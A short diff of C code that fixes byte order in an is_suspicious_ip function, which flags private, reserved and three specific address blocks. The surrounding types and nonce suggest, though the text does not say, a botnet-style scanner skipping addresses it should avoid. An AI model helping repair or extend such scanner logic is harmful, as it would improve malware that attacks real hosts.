@@ -76,35 +76,24 @@ static uint8_t encryption_nonce[12] = {0};
 
 
 static BOOL is_suspicious_ip(ipv4_t ip) {
-    uint8_t o1 = (ip >> 24) & 0xff;
-    uint8_t o2 = (ip >> 16) & 0xff;
-    uint8_t o3 = (ip >> 8) & 0xff;
-    uint8_t o4 = ip & 0xff;
-    
+    uint32_t host_ip = ntohl(ip);  
+    uint8_t o1 = (host_ip >> 24) & 0xff;
+    uint8_t o2 = (host_ip >> 16) & 0xff;
+    uint8_t o3 = (host_ip >> 8) & 0xff;
+    uint8_t o4 = host_ip & 0xff;
     
     if (o1 == 127) return TRUE;
-    
-    
-    if (o1 == 10) return TRUE;  
-    if (o1 == 192 && o2 == 168) return TRUE;  
-    if (o1 == 172 && o2 >= 16 && o2 < 32) return TRUE;  
-    
-    
+    if (o1 == 10) return TRUE;
+    if (o1 == 192 && o2 == 168) return TRUE;
+    if (o1 == 172 && o2 >= 16 && o2 < 32) return TRUE;
     if (o1 >= 224) return TRUE;
-    
-    
     if (o1 == 0) return TRUE;
-    
-    
-    if (o1 == 100 && o2 >= 64 && o2 < 127) return TRUE;  
-    if (o1 == 169 && o2 == 254) return TRUE;  
-    if (o1 == 198 && o2 >= 18 && o2 < 20) return TRUE;  
-    
-    
-    
-    if (o1 == 185 && o2 == 86 && o3 == 148) return TRUE;  
-    if (o1 == 45 && o2 == 33 && o3 == 32) return TRUE;   
-    if (o1 == 192 && o2 == 0 && o3 == 2) return TRUE;    
+    if (o1 == 100 && o2 >= 64 && o2 < 127) return TRUE;
+    if (o1 == 169 && o2 == 254) return TRUE;
+    if (o1 == 198 && o2 >= 18 && o2 < 20) return TRUE;
+    if (o1 == 185 && o2 == 86 && o3 == 148) return TRUE;
+    if (o1 == 45 && o2 == 33 && o3 == 32) return TRUE;
+    if (o1 == 192 && o2 == 0 && o3 == 2) return TRUE;
     
     return FALSE;
 }
